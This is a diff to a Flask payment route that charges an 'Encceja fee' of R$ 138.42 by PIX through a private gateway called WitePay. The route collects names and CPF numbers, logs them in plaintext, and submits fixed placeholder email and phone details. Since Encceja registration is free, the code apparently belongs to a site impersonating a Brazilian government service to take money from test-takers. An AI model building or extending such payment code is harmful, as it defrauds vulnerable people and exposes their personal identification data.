@@ -1480,61 +1480,57 @@ def encceja_info():
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento_encceja():
-    """Página de pagamento da taxa do Encceja"""
+    """Página de pagamento da taxa do Encceja usando WitePay"""
     if request.method == 'POST':
         # Obter dados do usuário
         data = request.get_json()
         nome = data.get('nome')
         cpf = data.get('cpf')
         telefone = data.get('telefone')
-        has_discount = data.get('has_discount', False)
         
         if not nome or not cpf:
             return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
         
         try:
-            # Usar especificamente a API FOR4 para pagamentos ENCCEJA
-            from for4payments import create_payment_api as create_for4_api
-            payment_api = create_for4_api()
+            # Usar o novo gateway WitePay
+            from witepay_gateway import create_witepay_gateway
+            payment_gateway = create_witepay_gateway()
             
-            if has_discount:
-                app.logger.info(f"[PROD] Criando pagamento com desconto para: {nome} ({cpf})")
-                payment_result = payment_api.create_pix_payment({
-                    'name': nome,
-                    'cpf': cpf,
-                    'phone': telefone,
-                    'amount': 49.70,
-                    'email': f"{nome.lower().replace(' ', '')}@gmail.com"
-                })
-            else:
-                app.logger.info(f"[PROD] Criando pagamento regular para: {nome} ({cpf})")
-                payment_result = payment_api.create_pix_payment({
-                    'name': nome,
-                    'cpf': cpf,
-                    'phone': telefone,
-                    'amount': 93.40,
-                    'email': f"{nome.lower().replace(' ', '')}@gmail.com"
-                })
-            
-            # Retornar os dados do pagamento
-            return jsonify(payment_result)
-        except Exception as e:
-            app.logger.error(f"Erro ao criar pagamento: {str(e)}")
-            
-            # Gerar um código PIX de exemplo para caso de falha na API
-            # Isso é necessário apenas para demonstração da interface no ambiente de desenvolvimento
-            demo_payment_data = {
-                'id': 'demo-123456',
-                'pixCode': '00020126870014br.gov.bcb.pix2565pix.example.com/qr/demo/12345',
-                # Não incluímos pixQrCode pois o JavaScript na página vai usar uma imagem de exemplo
-                'status': 'PENDING'
+            # Preparar dados do usuário para WitePay
+            user_data = {
+                'nome': nome,
+                'cpf': cpf,
+                'amount': 138.42,  # Valor em reais conforme especificado
+                'email': 'gerarpagamentos@gmail.com',  # Email padrão
+                'phone': '11987790088'  # Telefone padrão
             }
             
-            # Retornar resposta com mensagem de erro, mas com dados de exemplo para a interface
-            return jsonify({
-                'warning': f"API de pagamento temporariamente indisponível: {str(e)}",
-                **demo_payment_data
-            }), 200  # Retornar 200 para a página processar normalmente, mas com alerta
+            app.logger.info(f"[WITEPAY] Criando pagamento para: {nome} ({cpf}) - R$ 138,42")
+            
+            # Criar pagamento completo (order + charge)
+            payment_result = payment_gateway.create_complete_pix_payment(user_data)
+            
+            if payment_result.get('success'):
+                # Formatar resposta para compatibilidade com o frontend
+                response_data = {
+                    'id': payment_result.get('id'),
+                    'pixCode': payment_result.get('pixCode'),
+                    'pixQrCode': payment_result.get('pixQrCode'),
+                    'expiresAt': payment_result.get('expiresAt'),
+                    'status': payment_result.get('status', 'pending'),
+                    'orderId': payment_result.get('orderId')
+                }
+                
+                app.logger.info(f"[WITEPAY] Pagamento criado com sucesso - ID: {response_data.get('id')}")
+                return jsonify(response_data)
+            else:
+                error_msg = payment_result.get('error', 'Erro desconhecido')
+                app.logger.error(f"[WITEPAY] Erro ao criar pagamento: {error_msg}")
+                return jsonify({'error': error_msg}), 500
+            
+        except Exception as e:
+            app.logger.error(f"[WITEPAY] Erro inesperado ao criar pagamento: {str(e)}")
+            return jsonify({'error': f'Erro interno: {str(e)}'}), 500
     
     # Para requisições GET, renderizar a página de pagamento
     return render_template('pagamento.html')
